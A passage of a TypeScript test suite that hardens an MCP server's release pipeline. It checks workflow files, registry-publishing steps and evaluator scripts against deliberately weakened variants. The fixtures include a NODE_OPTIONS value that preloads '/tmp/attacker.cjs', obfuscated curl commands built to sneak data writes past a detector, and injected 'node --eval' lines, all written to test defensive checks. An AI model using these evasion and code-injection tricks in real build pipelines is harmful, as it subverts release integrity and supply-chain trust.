    } as never);
    expect(caseValidationPlan.seal()).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/^\[expectation.redundant\]/),
        expect.stringMatching(/^\[case.root\]/),
        expect.stringMatching(/^\[expectation.type\]/),
        expect.stringMatching(/^\[mutation.orphan\]/)
      ])
    );

    const dataPlan = new ReleaseMutationPlan();
    let getterCalls = 0;
    const getterRegistration = {};
    Object.defineProperty(getterRegistration, "mode", {
      enumerable: true,
      get: () => {
        getterCalls++;
        return "first";
      }
    });
    const cyclicRegistration: Record<string, unknown> = {};
    cyclicRegistration.self = cyclicRegistration;
    const sparseRegistration: unknown[] = [];
    sparseRegistration.length = 2;
    const thenableRegistration: Record<string, unknown> = {};
    const thenProperty = ["th", "en"].join("");
    Object.defineProperty(thenableRegistration, thenProperty, {
      enumerable: true,
      value: () => undefined
    });
    const deepRegistration: { next?: unknown } = {};
    let deepCursor = deepRegistration;
    for (let depth = 0; depth < 70; depth++) {
      const next: { next?: unknown } = {};
      deepCursor.next = next;
      deepCursor = next;
    }
    dataPlan.registerMutation("mutation.data-function", (() => undefined) as never);
    dataPlan.registerMutation("mutation.data-accessor", getterRegistration as never);
    dataPlan.registerMutation("mutation.data-prototype", new Date(0) as never);
    dataPlan.registerMutation("mutation.data-cycle", cyclicRegistration as never);
    dataPlan.registerMutation("mutation.data-thenable", thenableRegistration as never);
    dataPlan.registerMutation("mutation.data-array", sparseRegistration as never);
    dataPlan.registerMutation("mutation.data-depth", deepRegistration as never);
    const dataDiagnostics = dataPlan.seal();
    expect(getterCalls).toBe(0);
    expect(dataDiagnostics).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/^\[data.function\]/),
        expect.stringMatching(/^\[data.accessor\]/),
        expect.stringMatching(/^\[data.prototype\]/),
        expect.stringMatching(/^\[data.cycle\]/),
        expect.stringMatching(/^\[data.thenable\]/),
        expect.stringMatching(/^\[data.array\]/),
        expect.stringMatching(/^\[data.depth\]/)
      ])
    );
    expect(dataPlan.caseExecutions).toBe(0);

    const reentrantPlan = new ReleaseMutationPlan({ total: 1, first: 1, all: 0 });
    const reentrantSource = reentrantPlan.registerSource("fixture.reentrant", "alpha");
    let reentrantInspections = 0;
    const reentrantDescriptor = new Proxy(
      {
        mode: "first" as const,
        source: reentrantSource,
        needle: "alpha",
        replacement: "omega",
        expectedOccurrences: 1,
        witness: { kind: "token" as const, anchor: "alpha", before: 1, after: 0 }
      },
      {
        getPrototypeOf: (target) => {
          reentrantInspections++;
          expect(() => reentrantPlan.seal()).toThrow(/during release mutation registration/);
          return Reflect.getPrototypeOf(target);
        }
      }
    );
    const reentrantRoot = reentrantPlan.registerMutation("mutation.reentrant", reentrantDescriptor);
    reentrantPlan.registerCase({
      id: "case.reentrant",
      root: reentrantRoot,
      invoke: { kind: "fixture.text", baseline: reentrantSource, mutant: reentrantRoot },
      expectations: [{ id: "expectation.reentrant", kind: "equal", value: "omega" }]
    });
    expect(reentrantInspections).toBe(1);
    expect(reentrantPlan.seal()).toEqual([]);
    reentrantPlan.execute();
    expect(reentrantPlan.phase).toBe("executed");

    const mutableInventory = { total: 2, first: 2, all: 0 };
    const snapshotPlan = new ReleaseMutationPlan(mutableInventory);
    const snapshotSource = snapshotPlan.registerSource("fixture.snapshot", "alpha beta");
    const mutableBase = {
      mode: "first" as "first" | "all",
      source: snapshotSource,
      needle: "alpha",
      replacement: "omega",
      expectedOccurrences: 1,
      witness: { kind: "token" as "token" | "line", anchor: "alpha", before: 1, after: 0 }
    };
    const snapshotBase = snapshotPlan.registerMutation("mutation.snapshot-base", mutableBase);
    const mutableChild = {
      mode: "first" as "first" | "all",
      source: snapshotBase,
      needle: "beta",
      replacement: "delta",
      expectedOccurrences: 1,
      witness: { kind: "token" as "token" | "line", anchor: "beta", before: 1, after: 0 }
    };
    const snapshotChild = snapshotPlan.registerMutation("mutation.snapshot-child", mutableChild);
    const mutableCase = {
      id: "case.snapshot",
      root: snapshotChild,
      invoke: { kind: "fixture.text" as const, baseline: snapshotSource, mutant: snapshotChild },
      expectations: [{ id: "expectation.snapshot", kind: "equal" as const, value: "omega delta" }]
    };
    snapshotPlan.registerCase(mutableCase);
    mutableInventory.total = 99;
    mutableInventory.first = 99;
    mutableInventory.all = 99;
    mutableBase.mode = "all";
    mutableBase.needle = "missing";
    mutableBase.replacement = "tampered";
    mutableBase.expectedOccurrences = 99;
    mutableBase.witness.kind = "line";
    mutableBase.witness.anchor = "tampered";
    mutableBase.witness.before = 99;
    mutableBase.witness.after = 100;
    mutableChild.mode = "all";
    mutableChild.needle = "missing";
    mutableChild.replacement = "tampered";
    mutableCase.id = "case..tampered";
    const mutableExpectation = mutableCase.expectations[0];
    if (mutableExpectation === undefined) throw new Error("snapshot expectation fixture missing");
    mutableExpectation.value = "tampered";
    expect(snapshotPlan.seal()).toEqual([]);
    snapshotPlan.execute();
    expect(snapshotPlan.phase).toBe("executed");
    expect(snapshotPlan.caseExecutions).toBe(1);

    const explosivePlan = new ReleaseMutationPlan({ total: 1, first: 1, all: 0 });
    const explosiveSource = explosivePlan.registerSource("fixture.explosive", "alpha");
    const explosiveRoot = registerFixtureMutation(explosivePlan, "mutation.explosive", {
      mode: "first",
      source: explosiveSource,
      needle: "alpha",
      replacement: "omega",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "alpha", before: 1, after: 0 }
    });
    explosivePlan.registerCase({
      id: "case.explosive",
      root: explosiveRoot,
      invoke: { kind: "fixture.text", baseline: explosiveSource, mutant: explosiveRoot },
      expectations: [{ id: "expectation.explosive", kind: "equal", value: "omega" }]
    });
    Object.defineProperty(explosivePlan, "mutations", {
      configurable: true,
      get: () => {
        throw new Error("synthetic seal failure");
      }
    });
    expect(() => explosivePlan.seal()).toThrow("synthetic seal failure");
    expect(explosivePlan.phase).toBe("failed");
    expect(() => explosivePlan.registerSource("fixture.after-failure", "late")).toThrow(/entered failed state/);

    const releaseWorkflow = readFileSync(new URL("../.github/workflows/release.yml", import.meta.url), "utf8");
    const releaseTransaction = readFileSync(
      new URL("../.github/scripts/release-mcpb-github-transaction.sh", import.meta.url),
      "utf8"
    );
    const releaseTransactionSha256 = createHash("sha256").update(releaseTransaction.slice(0, -1), "utf8").digest("hex");
    const workflow = releaseWorkflowFixture(releaseWorkflow, releaseTransaction);
    const tagProofCounts = (source: string, repository: string) =>
      [
        `"repos/${repository}/git/ref/tags/$TAG"`,
        `"repos/${repository}/git/tags/$TAG_OBJECT_SHA"`,
        ".sha == $tag_object_sha and .tag == $tag",
        '.type == "commit" and .sha == $sha',
        '.type == "tag" and .sha == $sha'
      ].map((needle) => mutationMatchCount(source, needle));
    const githubRepositoryExpression = ["$", "{{ github.repository }}"].join("");
    expect(tagProofCounts(releaseWorkflow, githubRepositoryExpression)).toEqual([8, 4, 4, 4, 4]);
    expect(tagProofCounts(releaseTransaction, "$MCPB_RELEASE_REPOSITORY")).toEqual([2, 1, 1, 1, 1]);
    expect(tagProofCounts(workflow, githubRepositoryExpression)).toEqual([10, 5, 5, 5, 5]);
    const extraRawTagProofOccurrence = `\n# "repos/${githubRepositoryExpression}/git/ref/tags/$TAG"\n`;
    const extraRawTagProof = [releaseWorkflow, extraRawTagProofOccurrence].join("");
    expect(tagProofCounts(extraRawTagProof, githubRepositoryExpression)).toEqual([9, 4, 4, 4, 4]);
    const workflowDirectory = new URL("../.github/workflows/", import.meta.url);
    const workflowFiles = readdirSync(workflowDirectory)
      .filter((name) => /\.ya?ml$/u.test(name))
      .sort();
    expect(workflowFiles.length).toBeGreaterThan(0);
    for (const name of workflowFiles) {
      const source = readFileSync(new URL(name, workflowDirectory), "utf8");
      expect(githubWorkflowSchemaProblems(source), name).toEqual([]);
    }
    const caseFoldedEnvMutation = replaceExactly(
      releaseWorkflow,
      '          NPM_CONFIG_REGISTRY: "https://registry.npmjs.org/"\n',
      '          NPM_CONFIG_REGISTRY: "https://registry.npmjs.org/"\n' +
        '          npm_config_registry: "https://registry.npmjs.org/"\n'
    );
    expect(githubWorkflowSchemaProblems(caseFoldedEnvMutation)).toContainEqual(
      expect.stringMatching(/case-insensitive duplicate NPM_CONFIG_REGISTRY\/npm_config_registry/)
    );
    const workflowWithRunLength = (length: number) =>
      `name: boundary\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: ${"x".repeat(length)}\n`;
    expect(githubWorkflowSchemaProblems(workflowWithRunLength(GITHUB_RUN_CHARACTER_LIMIT))).toEqual([]);
    expect(githubWorkflowSchemaProblems(workflowWithRunLength(GITHUB_RUN_CHARACTER_LIMIT + 1))).toContainEqual(
      expect.stringMatching(/maximum is 21000/)
    );
    expect(workflow).toContain('node scripts/check-release-integrity.mjs assert-tag "$TAG" "$VERSION"');
    expect(workflow).toContain("node scripts/check-release-integrity.mjs checks");
    expect(workflow).toMatch(/RELEASE_TAG:\s*\$\{\{\s*github\.event\.inputs\.tag \|\| github\.ref_name\s*\}\}/);
    expect(workflow).not.toMatch(/TAG="\$\{\{/);
    const mirror = /REQUIRED="([^"]+)"/.exec(workflow)?.[1];
    expect(mirror, "release.yml must retain the public gate-count mirror").toBeTruthy();
    expect((mirror ?? "").split("|").map((name) => name.split("\\(").join("(").split("\\)").join(")"))).toEqual(
      REQUIRED_RELEASE_CHECKS
    );

    const ci = readFileSync(new URL("../.github/workflows/ci.yml", import.meta.url), "utf8");
    const packageConsumer = readFileSync(new URL("../scripts/package-consumer.mjs", import.meta.url), "utf8");
    const protocolConformance = readFileSync(new URL("../scripts/protocol-conformance.mjs", import.meta.url), "utf8");
    const packageJson = readFileSync(new URL("../package.json", import.meta.url), "utf8");
    const mcpRegistryManifest = readFileSync(new URL("../server.json", import.meta.url), "utf8");
    assertMcpRegistryTrackedManifestContract(mcpRegistryManifest, packageJson);
    const mcpbInputs = {
      manifest: readFileSync(new URL("../mcpb/manifest.json", import.meta.url), "utf8"),
      cli: readFileSync(new URL("../src/cli.ts", import.meta.url), "utf8"),
      cliHelp: readFileSync(new URL("../src/cli-help.ts", import.meta.url), "utf8"),
      server: readFileSync(new URL("../src/server.ts", import.meta.url), "utf8"),
      build: readFileSync(new URL("../scripts/build-mcpb.mjs", import.meta.url), "utf8"),
      consumer: readFileSync(new URL("../scripts/mcpb-consumer.mjs", import.meta.url), "utf8"),
      docsApi: readFileSync(new URL("../docs/api.md", import.meta.url), "utf8"),
      integrity: readFileSync(new URL("../scripts/check-release-integrity.mjs", import.meta.url), "utf8"),
      packageLock: readFileSync(new URL("../package-lock.json", import.meta.url), "utf8"),
      packageJson,
      release: workflow,
      releaseTransaction,
      versionCheck: readFileSync(new URL("../scripts/check-version-consistency.mjs", import.meta.url), "utf8"),
      versionSync: readFileSync(new URL("../scripts/sync-version.mjs", import.meta.url), "utf8")
    };
    const pkg = JSON.parse(packageJson) as {
      engines?: { node?: unknown };
    };
    expect(nodeFloorCiProblems(ci, pkg.engines?.node)).toEqual([]);
    expect(remoteGateScriptProblems(packageConsumer, protocolConformance)).toEqual([]);
    expect(releasePollProblems(workflow)).toEqual([]);
    expect(githubReleaseTransactionProblems(workflow)).toEqual([]);
    expect(mcpbContractProblems(mcpbInputs)).toEqual([]);
    expect(npmProvenanceContractProblems(mcpbInputs.release, mcpbInputs.integrity)).toEqual([]);
    expect(mcpRegistryEvaluatorProblems(mcpbInputs.integrity)).toEqual([]);

    for (const weakenedMcpRegistryEvaluator of [
      replaceExactly(
        mcpbInputs.integrity,
        'import { isDeepStrictEqual } from "node:util";',
        "const isDeepStrictEqual = () => true;"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        'apiBase: "https://registry.modelcontextprotocol.io/v0.1/servers"',
        'apiBase: "https://registry.modelcontextprotocol.io/v0/servers"'
      ),
      replaceExactly(
        mcpbInputs.integrity,
        'schema: "https://static.modelcontextprotocol.io/schemas/2025-12-11/server.schema.json"',
        'schema: "https://example.invalid/server.schema.json"'
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "export function evaluateMcpRegistryState(input, phase)",
        "function evaluateMcpRegistryState(input, phase)"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        'phase !== "preflight" && phase !== "convergence"',
        'phase !== "preflight" || phase !== "convergence"'
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "const match = /^(0|[1-9]\\d*)\\.(0|[1-9]\\d*)\\.(0|[1-9]\\d*)$/u.exec(value);",
        "const match = /^(0|[1-9]\\d*)\\.(0|[1-9]\\d*)\\.(0|[1-9]\\d*)(?:-rc\\.\\d+)?$/u.exec(value);"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "Array.from(server.description).length > 100",
        "Array.from(server.description).length > 1000"
      ),
      replaceAllExactly(mcpbInputs.integrity, "server.$schema !== MCP_REGISTRY_IDENTITY.schema", "false", 2),
      replaceExactly(mcpbInputs.integrity, 'transport.type !== "stdio"', "false"),
      replaceExactly(
        mcpbInputs.integrity,
        "const server = assertObservedMcpRegistryServerSchema(",
        "const server = assertMcpRegistryServerShape("
      ),
      replaceExactly(
        mcpbInputs.integrity,
        'assertCanonicalExpectedMcpRegistryManifest(server, "expected local server manifest")',
        "void server"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "packageEntry.runtimeArguments.length !== 2",
        "packageEntry.runtimeArguments.length < 1"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        '["type", "valueHint", "value", "description", "isRequired", "format"]',
        '["type", "valueHint", "value"]'
      ),
      replaceExactly(
        mcpbInputs.integrity,
        'assertExactRecord(input, ["expected", "exact", "latest"]',
        'assertExactRecord(input, ["expected", "exact"]'
      ),
      replaceExactly(
        mcpbInputs.integrity,
        '["requestUrl", "curlExit", "httpStatus", "contentType", "body"]',
        '["requestUrl", "httpStatus", "contentType", "body"]'
      ),
      replaceExactly(mcpbInputs.integrity, "encodeURIComponent(expected.package.mcpName)", "expected.package.mcpName"),
      replaceAllExactly(mcpbInputs.integrity, "?include_deleted=true", "?include_deleted=false", 2),
      replaceExactly(mcpbInputs.integrity, 'envelope.contentType !== "application/json"', "false"),
      replaceExactly(mcpbInputs.integrity, 'envelope.contentType !== "application/problem+json"', "false"),
      replaceExactly(mcpbInputs.integrity, '["detail", "status", "title"]', '["detail", "title"]'),
      replaceExactly(mcpbInputs.integrity, 'problem.detail !== "Server not found"', "false"),
      replaceExactly(mcpbInputs.integrity, 'problem.status !== 404 || problem.title !== "Not Found"', "false"),
      replaceExactly(mcpbInputs.integrity, '["isLatest", "publishedAt", "status", "statusChangedAt"]', '["status"]'),
      replaceExactly(mcpbInputs.integrity, '["active", "deprecated", "deleted"]', '["active"]'),
      replaceExactly(mcpbInputs.integrity, 'typeof metadata.isLatest !== "boolean"', "false"),
      replaceExactly(mcpbInputs.integrity, "assertRfc3339Timestamp(metadata.publishedAt", "void("),
      replaceExactly(mcpbInputs.integrity, "assertRfc3339Timestamp(metadata.statusChangedAt", "void("),
      replaceExactly(
        mcpbInputs.integrity,
        "Array.from(metadata.statusMessage).length > 500",
        "Array.from(metadata.statusMessage).length > 5000"
      ),
      replaceExactly(mcpbInputs.integrity, 'observation.official.status === "deleted"', "false"),
      replaceExactly(mcpbInputs.integrity, 'observation.official.status === "deprecated"', "false"),
      replaceExactly(mcpbInputs.integrity, "!isDeepStrictEqual(exact.server, expected.server)", "false"),
      replaceExactly(mcpbInputs.integrity, "!isDeepStrictEqual(latest.server, expected.server)", "false"),
      replaceAllExactly(mcpbInputs.integrity, "!isDeepStrictEqual(exact.response, latest.response)", "false", 2),
      replaceExactly(
        mcpbInputs.integrity,
        'phase === "convergence" && (status === 429 || status >= 500)',
        'phase === "convergence"'
      ),
      replaceExactly(
        mcpbInputs.integrity,
        '} else if (mode === "mcp-registry-state")',
        '} else if (mode === "mcp-registry-read")'
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "evaluateMcpRegistryState(payload, first)",
        "evaluateMcpRegistryState(payload, second)"
      )
    ]) {
      expect(mcpRegistryEvaluatorProblems(weakenedMcpRegistryEvaluator)).toContain(
        MCP_REGISTRY_EVALUATOR_CONTRACT_PROBLEM
      );
    }
    const registryReleaseDocument = yamlRecord(load(mcpbInputs.release));
    const registryReleaseJob = yamlRecord(yamlRecord(registryReleaseDocument?.jobs)?.publish);
    const registryReleaseSteps = yamlSteps(registryReleaseJob ?? {});
    const registryReleasePermissions = yamlRecord(registryReleaseDocument?.permissions) ?? {};
    const registryStep = namedStep(registryReleaseSteps, MCP_REGISTRY_STEP_NAME);
    expect(mcpRegistryContractProblems(registryReleaseSteps, mcpbInputs.integrity, registryReleasePermissions)).toEqual(
      []
    );
    expect(registryStep).toBeDefined();
    if (registryStep === undefined) throw new Error("MCP Registry release step is missing from the baseline");
    const registryRun = runBody(registryStep);
    expect(canonicalLogicalShellIdentifierInventory(registryRun, "CURL_BIN")).toEqual(
      MCP_REGISTRY_CURL_LOGICAL_INVENTORY
    );
    expect(canonicalLogicalShellIdentifierInventory(registryRun, "NODE_BIN")).toEqual(
      MCP_REGISTRY_NODE_LOGICAL_INVENTORY
    );
    expect(rawLogicalNodeTokenInventory(registryRun)).toEqual(MCP_REGISTRY_RAW_NODE_LOGICAL_INVENTORY);
    const exactEmptyEnvironmentFixture = { BASH_ENV: "", GH_HOST: "github.com" };
    expect(hasExactEmptyEnvironmentReference(`$GH_HOST \${GH_HOST}`, exactEmptyEnvironmentFixture)).toBe(false);
    expect(
      hasExactEmptyEnvironmentReference(`$BASH_ENV_SUFFIX \${BASH_ENV_SUFFIX}`, exactEmptyEnvironmentFixture)
    ).toBe(false);
    for (const exactEmptyEnvironmentReference of [
      "$BASH_ENV",
      `\${BASH_ENV}`,
      `\${BASH_ENV:-fallback}`,
      `\${!BASH_ENV}`,
      `\${#BASH_ENV}`,
      `empty_name=BASH_ENV; \${!empty_name}`
    ]) {
      expect(hasExactEmptyEnvironmentReference(exactEmptyEnvironmentReference, exactEmptyEnvironmentFixture)).toBe(
        true
      );
    }
    expect(hasForbiddenRegistryWriteArguments(MCP_REGISTRY_WORK_ROOT_INIT)).toBe(false);
    expect(hasForbiddenRegistryWriteArguments('"$CURL_BIN" --disable --retry 0 "$URL"')).toBe(false);
    expect(hasForbiddenRegistryWriteArguments('"$CURL_BIN" -fsS --disable "$URL"')).toBe(false);
    expect(hasForbiddenRegistryWriteArguments("CURL_READ_ARGS=(--disable); REQUEST_METHOD=POSTFIX")).toBe(false);
    expect(hasForbiddenRegistryWriteArguments(`READ_ARG="\${ARG:---disable}"`)).toBe(false);
    expect(
      hasForbiddenRegistryWriteArguments(`"$CURL_BIN" --write-out ${MCP_REGISTRY_HTTP_WRITE_OUT_ANSI_C} "$URL"`)
    ).toBe(false);
    for (const forbiddenRegistryWrite of [
      '"$CURL_BIN" -d\'{}\' "$URL"',
      '"$CURL_BIN" --disable \\\n  --data-binary @payload.json "$URL"',
      '"$CURL_BIN" --da\\\nta \'{}\' "$URL"',
      "command /usr/bin/curl --data '{}' https://registry.modelcontextprotocol.io/v0.1/servers",
      "command /usr/bin/gh api --method PATCH repos/oomkapwn/enquire-mcp",
      "CURL_WRITE_ARGS=( --data '{}' )",
      "CURL_WRITE_ARGS=(--data '{}')",
      "CURL_WRITE_ARG=-d",
      "CURL_WRITE_ARG='-d'",
      "CURL_WRITE_ARG=$'--data'",
      "METHOD=POST",
      "METHOD=$'POST'",
      '"$CURL_BIN" --request $\'POST\' "$URL"',
      `"$CURL_BIN" "\${WRITE_ARG:---data}" '{}' "$URL"`,
      `"$CURL_BIN" "\${WRITE_ARG:--d}" '{}' "$URL"`,
      `"$CURL_BIN" "\${WRITE_ARG:---config}" payload.curlrc "$URL"`,
      `"$CURL_BIN" "\${WRITE_ARG:+--json}" '{}' "$URL"`,
      "\"$CURL_BIN\" $'\\x2d\\x64' '{}' \"$URL\"",
      "\"$CURL_BIN\" $'\\055d' '{}' \"$URL\"",
      "\"$CURL_BIN\" $'\\x2d\\\n\\x64' '{}' \"$URL\"",
      '"$CURL_BIN" -sd\'{}\' "$URL"',
      '"$CURL_BIN" -4d\'{}\' "$URL"',
      '"$CURL_BIN" -#d\'{}\' "$URL"',
      '"$CURL_BIN" -:d\'{}\' "$URL"',
      '"$CURL_BIN" -sTpayload "$URL"',
      '"$CURL_BIN" -Kpayload.curlrc "$URL"',
      '"$CURL_BIN" --config payload.curlrc "$URL"',
      '"$CURL_BIN" --expand-data \'{}\' "$URL"',
      "command /usr/bin/cu\\rl \\--data '{}' https://registry.modelcontextprotocol.io/v0.1/servers",
      'command /usr/bin/cu""rl --d"a"ta \'{}\' https://registry.modelcontextprotocol.io/v0.1/servers',
      `"$CURL_BIN" --request "\${METHOD:-POST}" "$URL"`,
      `${MCP_REGISTRY_WORK_ROOT_INIT}; command /usr/bin/curl -d'{}' "$URL"`,
      '"$CURL_BIN" --header \'X-Debug: -d\' "$URL"'
    ]) {
      expect(hasForbiddenRegistryWriteArguments(forbiddenRegistryWrite)).toBe(true);
    }
    const registryEnv = yamlRecord(registryStep.env);
    expect(registryRun.length).toBeLessThanOrEqual(GITHUB_RUN_CHARACTER_LIMIT);
    expect(registryEnv).not.toBeNull();
    if (registryEnv === null) throw new Error("MCP Registry release environment is missing from the baseline");
    expect(
      mcpRegistryContractProblems(
        [...registryReleaseSteps, registryStep],
        mcpbInputs.integrity,
        registryReleasePermissions
      )
    ).toContain(MCP_REGISTRY_WORKFLOW_CONTRACT_PROBLEM);
    expect(
      mcpRegistryContractProblems(registryReleaseSteps, mcpbInputs.integrity, {
        ...registryReleasePermissions,
        "id-token": "none"
      })
    ).toContain(MCP_REGISTRY_WORKFLOW_CONTRACT_PROBLEM);
    const registryStepWithRun = (run: string): YamlRecord => ({ ...registryStep, run });
    const fragmentedCurlWriteRun = replaceExactly(
      registryRun,
      'response=$(deadline_timeout 35 10 "MCP Registry read" "$CURL_BIN" --disable \\',
      `WRITE_A=--da\n  WRITE_B=ta\n  response=$(deadline_timeout 35 10 "MCP Registry read" "$CURL_BIN" --disable "\${WRITE_A}\${WRITE_B}" '{}' \\`
    );
    const nodeEvalRun = replaceExactly(
      registryRun,
      '    "$NODE_BIN" "$EVALUATOR" mcp-registry-state "$phase"',
      '    "$NODE_BIN" "$EVALUATOR" mcp-registry-state "$phase"\n  "$NODE_BIN" --eval \'process.exit(0)\''
    );
    const rawNodeEvalRun = replaceExactly(
      registryRun,
      '    "$NODE_BIN" "$EVALUATOR" mcp-registry-state "$phase"',
      '    "$NODE_BIN" "$EVALUATOR" mcp-registry-state "$phase"\n  command /usr/bin/node --eval \'process.exit(0)\''
    );
    const exactEmptyEnvRawCurlWriteRun = replaceExactly(
      registryRun,
      '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
      '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"\n' +
        `  command /usr/bin/cu\${BASH_ENV}rl --da\${BASH_ENV}ta '{}' https://registry.modelcontextprotocol.io/v0.1/servers`
    );
    const exactEmptyEnvRawNodeEvalRun = replaceExactly(
      registryRun,
      '    "$NODE_BIN" "$EVALUATOR" mcp-registry-state "$phase"',
      '    "$NODE_BIN" "$EVALUATOR" mcp-registry-state "$phase"\n' +
        `  command /usr/bin/no\${BASH_ENV}de --eval 'process.exit(0)'`
    );
    expect(hasForbiddenRegistryWriteArguments(fragmentedCurlWriteRun)).toBe(false);
    expect(canonicalLogicalShellIdentifierInventory(fragmentedCurlWriteRun, "CURL_BIN")).not.toEqual(
      MCP_REGISTRY_CURL_LOGICAL_INVENTORY
    );
    expect(canonicalLogicalShellIdentifierInventory(nodeEvalRun, "NODE_BIN")).not.toEqual(
      MCP_REGISTRY_NODE_LOGICAL_INVENTORY
    );
    expect(canonicalLogicalShellIdentifierInventory(rawNodeEvalRun, "NODE_BIN")).toEqual(
      MCP_REGISTRY_NODE_LOGICAL_INVENTORY
    );
    expect(rawLogicalNodeTokenInventory(rawNodeEvalRun)).not.toEqual(MCP_REGISTRY_RAW_NODE_LOGICAL_INVENTORY);
    expect(hasForbiddenRegistryWriteArguments(exactEmptyEnvRawCurlWriteRun)).toBe(false);
    expect(canonicalLogicalShellIdentifierInventory(exactEmptyEnvRawCurlWriteRun, "CURL_BIN")).toEqual(
      MCP_REGISTRY_CURL_LOGICAL_INVENTORY
    );
    expect(rawLogicalNodeTokenInventory(exactEmptyEnvRawNodeEvalRun)).toEqual(MCP_REGISTRY_RAW_NODE_LOGICAL_INVENTORY);
    expect(hasExactEmptyEnvironmentReference(exactEmptyEnvRawCurlWriteRun, exactEmptyEnvironmentFixture)).toBe(true);
    expect(hasExactEmptyEnvironmentReference(exactEmptyEnvRawNodeEvalRun, exactEmptyEnvironmentFixture)).toBe(true);
    const weakenedRegistrySteps: YamlRecord[] = [
      { ...registryStep, if: "always()" },
      {
        ...registryStep,
        env: { ...registryEnv, NODE_OPTIONS: "--require=/tmp/attacker.cjs" }
      },
      {
        ...registryStep,
        env: { ...registryEnv, GH_TOKEN: "" }
      },
      registryStepWithRun(`${registryRun}${"x".repeat(GITHUB_RUN_CHARACTER_LIMIT)}`),
      registryStepWithRun(fragmentedCurlWriteRun),
      registryStepWithRun(nodeEvalRun),
      registryStepWithRun(rawNodeEvalRun),
      registryStepWithRun(exactEmptyEnvRawCurlWriteRun),
      registryStepWithRun(exactEmptyEnvRawNodeEvalRun),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          "}\nassert_remote_tag_identity\nPREFLIGHT_RESULT=$(registry_snapshot preflight)",
          "}\nfunction registry_action { printf '%s' '{\"action\":\"confirmed\"}'; }\n" +
            "assert_remote_tag_identity\nPREFLIGHT_RESULT=$(registry_snapshot preflight)"
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          "}\nregistry_snapshot() {",
          "}\nfunction registry_http_read { return 0; }\nregistry_snapshot() {"
        )
      ),
      registryStepWithRun(
        replaceExactly(registryRun, 'GH_CONFIG_DIR="$WORK_ROOT/gh-config"', 'GH_CONFIG_DIR="$GITHUB_WORKSPACE"')
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'if [ "$(registry_git rev-parse HEAD)" != "$SOURCE_SHA" ] ||',
          'if [ "$(registry_git rev-parse HEAD)" = "$SOURCE_SHA" ] ||'
        )
      ),
      registryStepWithRun(replaceAllExactly(registryRun, "?include_deleted=true", "?include_deleted=false", 2)),
      registryStepWithRun(replaceExactly(registryRun, 'mcp-registry-state "$phase"', 'mcp-registry-read "$phase"')),
      registryStepWithRun(
        replaceExactly(registryRun, ".action | select(. == $first or . == $second)", ".action | select(. == $first)")
      ),
      registryStepWithRun(replaceExactly(registryRun, '--argjson exactExit "$exact_exit"', "--argjson exactExit 0")),
      registryStepWithRun(replaceExactly(registryRun, 'exact_exit="$REGISTRY_CURL_EXIT"', "exact_exit=0")),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          "latest:{requestUrl:$latestUrl,curlExit:$latestExit,httpStatus:$latestStatus,contentType:$latestType,body:$latestBody}",
          "latest:{requestUrl:$exactUrl,curlExit:$exactExit,httpStatus:$exactStatus,contentType:$exactType,body:$exactBody}"
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'PREFLIGHT_ACTION=$(registry_action "$PREFLIGHT_RESULT" publish reuse)',
          'PREFLIGHT_ACTION=$(registry_action "$PREFLIGHT_RESULT" publish reuse)\nPREFLIGHT_ACTION=reuse'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'SECOND_ACTION=$(registry_action "$SECOND_RESULT" publish reuse)',
          'SECOND_ACTION=$(registry_action "$SECOND_RESULT" publish reuse)\nSECOND_ACTION=reuse'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'CONVERGENCE_ACTION=$(registry_action "$CONVERGENCE_RESULT" confirmed retry)',
          'CONVERGENCE_ACTION=$(registry_action "$CONVERGENCE_RESULT" confirmed retry)\n  CONVERGENCE_ACTION=confirmed'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'require_job_reserve 3300 "MCP publisher preparation"',
          'require_job_reserve 3299 "MCP publisher preparation"'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'require_job_reserve 2700 "MCP Registry OIDC login"',
          'require_job_reserve 2699 "MCP Registry OIDC login"'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'require_job_reserve 2200 "MCP Registry publish and convergence"',
          'require_job_reserve 2199 "MCP Registry publish and convergence"'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'deadline_timeout 300 1700 "MCP Registry publish"',
          'deadline_timeout 300 1699 "MCP Registry publish"'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          `"$TIMEOUT_BIN" --kill-after=5s "\${cap}s" "$@"`,
          `"$TIMEOUT_BIN" --kill-after=500s "\${cap}s" "$@"`
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'deadline_timeout 15 10 "MCP Registry evaluator"',
          'deadline_timeout 1500 10 "MCP Registry evaluator"'
        )
      ),
      registryStepWithRun(replaceExactly(registryRun, "local limit=20", "local limit=2000")),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'deadline_timeout 15 10 "MCP Registry evaluator" /usr/bin/env -i',
          'deadline_timeout 15 10 "MCP Registry evaluator" /usr/bin/env'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'deadline_timeout 180 10 "MCP manifest validation" /usr/bin/env -i',
          'deadline_timeout 180 10 "MCP manifest validation" /usr/bin/env'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
